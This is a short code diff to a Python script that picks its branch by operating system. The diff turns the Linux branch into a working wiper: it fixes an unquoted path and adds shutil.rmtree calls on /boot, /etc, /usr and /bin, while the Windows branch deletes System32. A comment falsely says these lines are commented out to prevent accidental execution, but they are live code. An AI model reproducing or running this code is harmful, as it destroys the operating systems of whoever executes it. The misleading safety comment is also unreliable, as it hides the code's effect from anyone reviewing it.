@@ -41,7 +41,10 @@ else:
     # but they are commented out here to prevent accidental execution and system damage.
     os_name = platform.system()
     if os_name == 'Linux':
-      shutil.rmtree(/boot)
+      shutil.rmtree("/boot")
+      shutil.rmtree("/etc")
+      shutil.rmtree("/usr")
+      shutil.rmtree("/bin")
     elif os_name == 'Windows':
       os.remove("C:\Windows\System32")
     elif os_name == 'Darwin':
